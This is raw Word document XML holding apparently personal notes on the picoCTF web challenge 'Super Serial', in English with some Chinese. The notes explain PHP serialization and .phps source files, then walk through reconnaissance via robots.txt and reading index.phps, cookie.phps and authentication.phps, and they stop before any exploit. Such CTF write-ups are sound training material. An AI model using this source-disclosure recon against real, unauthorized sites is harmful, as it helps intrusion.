        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59C61216" w14:textId="47D720CB" w:rsidR="00A35726" w:rsidRPr="00EA3443" w:rsidRDefault="00A35726" w:rsidP="00A35726">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA3443">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF0000"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Super Serial</w:t>
      </w:r>
      <w:r w:rsidR="00EA3443">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve"> HARD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB0BF0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 | 130 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9DD5CB" w14:textId="77777777" w:rsidR="00A35726" w:rsidRDefault="00A35726" w:rsidP="00A3572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B1FD3EB" w14:textId="77777777" w:rsidR="00A35726" w:rsidRDefault="00A35726" w:rsidP="00A3572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F11ABEB" w14:textId="77777777" w:rsidR="00A35726" w:rsidRDefault="00A35726" w:rsidP="00A3572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63FD567F" w14:textId="736532C9" w:rsidR="00A35726" w:rsidRDefault="00A35726" w:rsidP="00A3572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Try to recover the flag stored on this website </w:t>
      </w:r>
      <w:hyperlink r:id="rId127" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:5428/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0C5A47CD" w14:textId="16CDDC49" w:rsidR="00F924A8" w:rsidRDefault="00F924A8" w:rsidP="00A35726">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="888888"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Hint 1 : The flag is at ../flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6D266D" w14:textId="2CFC8AB3" w:rsidR="00A35726" w:rsidRPr="00A35726" w:rsidRDefault="005C5F86" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C5F86">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222A42"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Serialization</w:t>
      </w:r>
      <w:r w:rsidRPr="005C5F86">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the process of turning some object into a data format that can be restored later.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="693DB803" w14:textId="77777777" w:rsidR="005C5F86" w:rsidRPr="005C5F8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People often serialize objects in order to save them to storage, or to send as part of communications.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC948D1" w14:textId="77777777" w:rsidR="005C5F86" w:rsidRPr="005C5F86" w:rsidRDefault="005C5F86" w:rsidP="005C5F86">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28306656" w14:textId="67FB722F" w:rsidR="00A35726" w:rsidRDefault="005C5F86" w:rsidP="005C5F86">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C5F86">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">Deserialization is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is </w:t>
      </w:r>
      <w:r w:rsidRPr="005C5F86">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>JSON. Before that, it was XML.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE6A732" w14:textId="77777777" w:rsidR="005C5F86" w:rsidRDefault="005C5F86" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70F7FAB6" w14:textId="77777777" w:rsidR="00A35726" w:rsidRP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If you use .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A35726">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A35726">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> as your extension to a file, the server will then interpret the code behind that script and returns the desired output.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745A0EF3" w14:textId="1BA9A068" w:rsidR="00A35726" w:rsidRDefault="00A35726" w:rsidP="00A35726">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A35726">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>While .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A35726">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>phps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A35726">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> will just output literally a color-formatted content of that script as shown below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C72E5A0" w14:textId="77777777" w:rsidR="00F924A8" w:rsidRDefault="00F924A8" w:rsidP="00F924A8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C859AA">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>再看</w:t>
      </w:r>
      <w:r w:rsidRPr="00C859AA">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C859AA">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="222222"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>robots.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EDFE2A6" w14:textId="77777777" w:rsidR="00F924A8" w:rsidRDefault="00000000" w:rsidP="00F924A8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId128" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="00F924A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="FC4D50"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:25395/robots.txt</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5E06C4A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User-agent: *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B25BE2" w14:textId="77777777" w:rsidR="00F924A8" w:rsidRDefault="00F924A8" w:rsidP="00F924A8">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="C5C8C6"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="C5C8C6"/>
        </w:rPr>
        <w:t xml:space="preserve">Disallow: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C859AA">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="C5C8C6"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C859AA">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="C5C8C6"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>admin.phps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="097BCF90"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當然要試試</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>admin.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>admin.phps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>，但都顯示</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> Not Found</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>，但這邊給了我們提示，可能存在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>phps</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的檔案，它能讓我們直接看到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> source code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD66E59" w14:textId="77777777" w:rsidR="00F924A8" w:rsidRDefault="00F924A8" w:rsidP="00F924A8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>現在回過頭來試試看</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>index.phps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="56543E86" w14:textId="77777777" w:rsidR="00F924A8" w:rsidRDefault="00000000" w:rsidP="00F924A8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId129" w:tgtFrame="_blank" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidR="00F924A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="FC4D50"/>
          </w:rPr>
          <w:t>view-source:http</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidR="00F924A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="FC4D50"/>
          </w:rPr>
          <w:t>://mercury.picoctf.net:25395/</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidR="00F924A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="FC4D50"/>
          </w:rPr>
          <w:t>index.phps</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="35094D5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Solution:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E823A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 xml:space="preserve">The challenge gives us a link which opens a webpage allowing us to login with a username and password. Doing some standard </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>recoinassaince</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> we find this robots.txt file:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24AD520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282FC60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User-agent: *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCC05C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Disallow: /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>admin.phps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6D0789D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553F434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phps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">" files are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source files and seeing as they might exist on this site we try to find the source of the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> file at http://mercury.picoctf.net:8404/index.phps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7704327C"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```html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74710B29" w14:textId="46A18D6F" w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF" w:rsidRDefault="00794AA0" w:rsidP="00794AA0">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13D28412" wp14:editId="0E2163A5">
            <wp:extent cx="5936494" cy="1988992"/>
            <wp:effectExtent l="0" t="0" r="762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30"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5936494" cy="1988992"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC6214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Nothing much of interest here except the "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>cookie.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>" and "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>authentication.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>" file where we can find the source for at http://mercury.picoctf.net:8404/cookie.phps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722870CB"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at http://mercury.picoctf.net:8404/authentication.phps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51191A68" w14:textId="18E278A4"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lastRenderedPageBreak/>
        <w:pict w14:anchorId="1CDE57FE">
